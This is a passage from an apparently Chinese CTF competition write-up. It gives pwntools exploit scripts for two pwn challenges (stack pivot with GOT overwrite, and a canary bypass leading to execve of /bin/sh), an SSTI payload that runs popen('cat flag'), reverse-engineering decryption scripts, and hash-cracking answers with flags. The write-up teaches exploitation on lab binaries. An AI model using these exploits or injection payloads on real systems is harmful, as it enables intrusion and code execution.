class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26870</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x401274</span></span><br><span class="line">got_addr = <span class="number">0x404000</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004012cd</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line">strlen = <span class="number">0x40128C</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x80</span> + p64(got_addr + <span class="number">0x800</span>) + p64(main)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x80</span> + p64(got_addr + <span class="number">0x100</span>) + p64(main) + p64(strlen_got + <span class="number">0x80</span>) + p64(main) + p64(strlen_got + <span class="number">0x98</span>) + p64(strlen) + p64(strlen_got + <span class="number">0x700</span>) + p64(main)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;OK&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">p = p64(<span class="number">0</span>) + p64(got_addr + <span class="number">0x820</span>) + p64(leave_ret) + p64(<span class="number">0</span>) + p64(got_addr + <span class="number">0x830</span>) + p64(leave_ret)</span><br><span class="line">p = p.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(got_addr + <span class="number">0x810</span>) + p64(leave_ret)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;OK&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;OK&#x27;</span>, p64(puts_plt))</span><br><span class="line"></span><br><span class="line">libc_base = get_libc() - <span class="number">0x88540</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./2.39/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000010f75b</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x88</span> + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;OK&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><code>p = b&#39;\x00&#39; * 0x80 + p64(got_addr + 0x800) + p64(main)</code></p>
<p>&#x3D;&gt; rbp &#x3D; got + 0x800</p>
<p><code>p = b&#39;\x00&#39; * 0x80 + p64(got_addr + 0x100) + p64(main) + p64(strlen_got + 0x80) + p64(main) + p64(strlen_got + 0x98) + p64(strlen) + p64(strlen_got + 0x700) + p64(main)</code></p>
<p>&#x3D;&gt; rbp &#x3D; got + 0x100</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">got + <span class="number">0x800</span> : p64(got_addr + <span class="number">0x100</span>) 	p64(main)</span><br><span class="line">got + <span class="number">0x810</span> : p64(strlen_got + <span class="number">0x80</span>) 	p64(main)</span><br><span class="line">got + <span class="number">0x820</span> : p64(strlen_got + <span class="number">0x98</span>) 	p64(strlen)</span><br><span class="line">got + <span class="number">0x830</span> : p64(strlen_got + <span class="number">0x700</span>) 	p64(main)</span><br></pre></td></tr></table></figure>

<p><code>p = p64(0) + p64(got_addr + 0x820) + p64(leave_ret) + p64(0) + p64(got_addr + 0x830) + p64(leave_ret) p = p.ljust(0x80, b&#39;\x00&#39;) + p64(got_addr + 0x810) + p64(leave_ret)</code></p>
<p>&#x3D;&gt; rbp &#x3D; got + 0x810</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">got + <span class="number">0x80</span> : p64(<span class="number">0</span>) 	 	 	 	 	p64(got_addr + <span class="number">0x820</span>) </span><br><span class="line">got + <span class="number">0x90</span> : p64(leave_ret) 	 	 	p64(<span class="number">0</span>)</span><br><span class="line">got + <span class="number">0xa0</span> : p64(got_addr + <span class="number">0x830</span>) 	 	p64(leave_ret)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">got + <span class="number">0x100</span> : p64(got_addr + <span class="number">0x810</span>) 	p64(leave_ret)</span><br></pre></td></tr></table></figure>

<p>接下来的程序流： </p>
<ul>
<li><p>leave_ret 迁移到 got_addr + 0x818，执行 main</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rbp : got + <span class="number">0x100</span>	=&gt;	got + <span class="number">0x810</span>	=&gt;	 strlen_got + <span class="number">0x80</span></span><br></pre></td></tr></table></figure>

<p>两次 pop rbp 后 rbp 变成 strlen_got + 0x80</p>
</li>
<li><p>此时 fgets 就是向 rbp - 0x80 即 strlen_got 读，发送 p64(puts_plt) 即可改 strlen_got 为 puts_plt</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rbp : strlen_got + <span class="number">0x80</span> = got + <span class="number">0x88</span> =&gt; got_addr + <span class="number">0x820</span> =&gt; strlen_got + <span class="number">0x98</span> = got + <span class="number">0xa0</span></span><br><span class="line">ret : got + <span class="number">0x90</span> =&gt; leave_ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>leave_ret 迁移到 rbp + 8 &#x3D; got_addr + 0x828 &#x3D;&gt; strlen，执行 main 中的 strlen，迁移时执行两次 pop rbp 使 rbp 变成 got + 0xa0</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rbp : got + <span class="number">0xa0</span> =&gt; got_addr + <span class="number">0x830</span></span><br><span class="line">ret : got + <span class="number">0xa8</span> =&gt; leave_ret</span><br></pre></td></tr></table></figure>

<p>所以 strlen 的一参是 rbp - 0x80 &#x3D; got + 0x20 &#x3D; setvbuf_got，而 strlen_got 已经被改成 puts_plt，相当于执行 puts 输出了 setvbuf_got，最后 ret 是 leave_ret</p>
</li>
<li><p>再次迁移到 rbp + 8 &#x3D; got_addr + 0x838 &#x3D; main，最后一次利用栈溢出写 rop 链执行 system(‘&#x2F;bin&#x2F;sh’)</p>
</li>
</ul>
<h3 id="rogue-like"><a href="#rogue-like" class="headerlink" title="rogue_like"></a>rogue_like</h3><p>本题有三次选择：</p>
<p>第一次选择一个武器，有三个选择，case 1 设置 libc 中任意 64 位地址为 0，case 2 写 libc 中任意地址一个 byte，case 3 泄露 &#x2F;proc&#x2F;self&#x2F;maps 中的地址；</p>
<p>第二次选择一个祝福，case 1 会崩溃，case 2 和 case 3 功能 都是给任意地址加上 5 以内的值；</p>
<p>第三次选择一个挑战，case 1 溢出 0x10，case 2 输出 0x120 后输入 0xf0，无溢出，case 3 两次 read，一次刚好到 rbp，并且存在栈的 off-by-null</p>
<p>但是题目开了 canary，所以需要组合三次选择来绕过 canary 并且执行 rop</p>
<p>思路：第一次选 1，改 tls 中的 canary 为 0，第二次选 2，让 got 表中的 alarm + 5 得到 syscall，第三次选 3，程序中已经有 &#x2F;bin&#x2F;sh，再利用第二次 read 控制 rax 执行 syscall 即可</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26870</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004013f4</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x00000000004013f6</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004013f8</span></span><br><span class="line">ret = <span class="number">0x00000000004007fe</span></span><br><span class="line">binsh = <span class="number">0x00000000004019d7</span></span><br><span class="line">syscall = elf.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;!&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x2568</span>))</span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;increase.&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;increase.&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x602058</span>))</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x7</span> + p64(ret) * <span class="number">24</span> + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">r.send(p)</span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x3</span> + p64(ret) * <span class="number">7</span></span><br><span class="line">r.send(p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>直接用hackbar生成的ssti的exp改改：<code>&#123;&#123;g.pop.globals.builtins'import'.popen('cat flag').read()&#125;&#125;</code></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="简单算术"><a href="#简单算术" class="headerlink" title="简单算术"></a>简单算术</h3><p>随波逐流穷举异或0-200在31找到flag：flag{x0r_Brute_is_easy!}</p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="easy-asm"><a href="#easy-asm" class="headerlink" title="easy-asm"></a>easy-asm</h3><p>flag{dea54885-92b4-11ef-b153-3c0af33af908}</p>
<p>已知flag开头</p>
<p>当黑盒做 直接猜出排序规律 根据偶数位的大小排序 两两一组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">ida_chars1 = [</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x16</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x30</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x21</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x2C</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0xCC</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0xCC</span>, <span class="number">0x2C</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x30</span>,</span><br><span class="line">    <span class="number">0x21</span>, <span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x40</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x55</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0x88</span>, <span class="number">0x42</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x99</span>, <span class="number">0x88</span>,</span><br><span class="line">    <span class="number">0xC2</span>, <span class="number">0xC2</span>,</span><br><span class="line">  <span class="number">0x22</span>, <span class="number">0xCC</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 0x22,0x10,0x22,0x15,0x66,0x16</span></span><br><span class="line"><span class="comment">#9,10 15 16 13 14</span></span><br><span class="line">ida_chars2 = [</span><br><span class="line">  <span class="number">0x44</span>, <span class="number">0x7C</span>, <span class="number">0x43</span>, <span class="number">0x72</span>, <span class="number">0x1D</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x41</span>, <span class="number">0x05</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0x19</span>, <span class="number">0x1A</span>, <span class="number">0x19</span>, <span class="number">0x0F</span>, <span class="number">0xF5</span>, <span class="number">0x10</span>, <span class="number">0xAE</span>, <span class="number">0x18</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x56</span>, <span class="number">0x00</span>, <span class="number">0x1E</span>, <span class="number">0x26</span>, <span class="number">0x71</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x78</span>, <span class="number">0x72</span>,</span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0x72</span>, <span class="number">0x52</span>, <span class="number">0x06</span>, <span class="number">0xAA</span>, <span class="number">0xBB</span>, <span class="number">0xA3</span>, <span class="number">0xA4</span>, <span class="number">0x1B</span> , <span class="number">0xFC</span>,</span><br><span class="line">  <span class="number">0xC7</span>, <span class="number">0x82</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ida_chars2)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(ida_chars1[i] ^ ida_chars2[i]),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    flag&#123;dea54885-92b4-11ef-b153-3c0af33af908&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h3><p>硬件断点调试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">ida_chars = [</span><br><span class="line">    <span class="number">0x5C</span>, <span class="number">0x76</span>, <span class="number">0x4A</span>, <span class="number">0x78</span>, <span class="number">0x15</span>, <span class="number">0x62</span>, <span class="number">0x05</span>, <span class="number">0x7C</span>, <span class="number">0x6B</span>, <span class="number">0x21</span>,</span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x66</span>, <span class="number">0x5B</span>, <span class="number">0x1A</span>, <span class="number">0x48</span>, <span class="number">0x7A</span>, <span class="number">0x1E</span>, <span class="number">0x46</span>, <span class="number">0x7F</span>, <span class="number">0x28</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x75</span>, <span class="number">0x68</span>, <span class="number">0x2A</span>, <span class="number">0x34</span>, <span class="number">0x0C</span>, <span class="number">0x4B</span>, <span class="number">0x1D</span>, <span class="number">0x3D</span>, <span class="number">0x2E</span>,</span><br><span class="line">    <span class="number">0x6B</span>, <span class="number">0x7A</span>, <span class="number">0x17</span>, <span class="number">0x45</span>, <span class="number">0x07</span>, <span class="number">0x75</span>, <span class="number">0x47</span>, <span class="number">0x27</span>, <span class="number">0x39</span>, <span class="number">0x78</span>,</span><br><span class="line">    <span class="number">0x61</span>, <span class="number">0x0B</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">xor_bytes = [</span><br><span class="line">    <span class="number">0x3a</span>, <span class="number">0x1a</span>, <span class="number">0x2b</span>, <span class="number">0x1f</span>, <span class="number">0x6e</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x45</span>, <span class="number">0x52</span>, <span class="number">0x44</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0x55</span>, <span class="number">0x3a</span>, <span class="number">0x37</span>, <span class="number">0x7d</span>, <span class="number">0x43</span>, <span class="number">0x7b</span>, <span class="number">0x23</span>, <span class="number">0x52</span>, <span class="number">0x1c</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x46</span>, <span class="number">0x0a</span>, <span class="number">0x07</span>, <span class="number">0x56</span>, <span class="number">0x38</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x10</span>, <span class="number">0x1d</span>,</span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x4a</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x61</span>, <span class="number">0x16</span>, <span class="number">0x75</span>, <span class="number">0x14</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>,</span><br><span class="line">    <span class="number">0x58</span>, <span class="number">0x76</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">decrypted_chars = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    decrypted_char = xor_bytes[i] ^ ida_chars[i]</span><br><span class="line">    decrypted_chars.append(<span class="built_in">chr</span>(decrypted_char))</span><br><span class="line"></span><br><span class="line">decrypted_text = <span class="string">&#x27;&#x27;</span>.join(decrypted_chars)</span><br><span class="line"><span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure>

<h3 id="ko0h"><a href="#ko0h" class="headerlink" title="ko0h"></a>ko0h</h3><p>前面的东西全是fake seh跳到其他地方</p>
<p>简单魔改RC4+一个key改值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init</span>(<span class="params">s, key, Len</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    k = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    tmp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        s[i] = i</span><br><span class="line">        k[i] = <span class="built_in">ord</span>(key[i % Len])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + k[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">s, Data, Len</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    tmp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(Len):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        tmp = s[i]</span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = tmp</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        Data[k] = (Data[k] + s[t]) % <span class="number">256</span>  <span class="comment"># 魔改点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    s2 = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    key = <span class="string">&quot;DDDDAAAASSSS&quot;</span></span><br><span class="line">    pData = [<span class="number">0x18</span>, <span class="number">0x9c</span>, <span class="number">0x47</span>, <span class="number">0x3d</span>, <span class="number">0x3b</span>, <span class="number">0xe1</span>, <span class="number">0x29</span>, <span class="number">0x27</span>, <span class="number">0x9f</span>, <span class="number">0x34</span>, <span class="number">0x83</span>, <span class="number">0xd5</span>, <span class="number">0xed</span>, <span class="number">0xb5</span>,</span><br><span class="line">            <span class="built_in">ord</span>(<span class="string">&#x27;n&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;Y&#x27;</span>), <span class="number">0x7f</span>, <span class="number">0xde</span>, <span class="number">0x47</span>, <span class="number">0xd7</span>, <span class="number">0x65</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x5b</span>, <span class="number">0x64</span>, <span class="number">0xb6</span>, <span class="number">0xfa</span>, <span class="number">0x94</span>, <span class="number">0x55</span>, <span class="number">0x87</span>, <span class="number">0x42</span>,</span><br><span class="line">            <span class="number">0x20</span>, <span class="number">6</span>, <span class="number">0xc</span>, <span class="number">0x69</span>, <span class="number">0xfe</span>, <span class="number">0x72</span>, <span class="number">0xa9</span>, <span class="number">0xe4</span>, <span class="number">0xd1</span>, <span class="number">0x7c</span>]</span><br><span class="line">   len_pData = <span class="built_in">len</span>(pData)</span><br><span class="line"></span><br><span class="line">    rc4_init(s, key, <span class="built_in">len</span>(key))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s[i]:02X&#125;</span>&quot;</span>, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        s2[i] = s[i]</span><br><span class="line">    rc4_crypt(s, pData, len_pData)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">bytes</span>(pData)&#125;</span>&quot;</span>)</span><br><span class="line">    rc4_crypt(s2, pData, len_pData)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;pData=<span class="subst">&#123;<span class="built_in">bytes</span>(pData)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="你是小哈斯"><a href="#你是小哈斯" class="headerlink" title="你是小哈斯?"></a>你是小哈斯?</h3><p>依次解sha1</p>
<p><a target="_blank" rel="noopener" href="http://www.ttmd5.com/hash.php?type=5%EF%BC%8Cflag%7Bgame_cqb_isis_cxyz%7D">http://www.ttmd5.com/hash.php?type=5，flag{game_cqb_isis_cxyz}</a></p>
<h3 id="通往哈希的旅程"><a href="#通往哈希的旅程" class="headerlink" title="通往哈希的旅程"></a>通往哈希的旅程</h3><p>cmd5.com在线解密：flag{18876011645}</p>
